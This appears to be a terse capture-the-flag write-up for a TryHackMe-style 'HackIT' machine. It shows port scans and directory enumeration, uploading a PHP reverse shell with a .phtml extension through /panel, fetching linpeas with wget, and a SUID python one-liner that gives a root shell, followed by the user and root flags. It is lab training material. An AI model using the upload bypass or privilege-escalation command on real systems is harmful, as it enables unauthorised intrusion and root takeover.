<pre>
Machine IP: 

Enum:
    Open ports:
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Enum port 80: (gobuster)
    /index.php (Status: 200)
/uploads (Status: 301)
    Uploads from panel
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
    Upload php reverse shell with .phtml extension


Priv esc enum: (linpeas.sh)
    Download lenpeas.sh via python http.server,wget

    And we find a priv esc path:
        /usr/bin/python
    
    And use that from gtfobins:
        /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

User Flag: THM{y0u_g0t_a_sh3ll}
Root Flag: THM{pr1v1l3g3_3sc4l4t10n}
</pre>
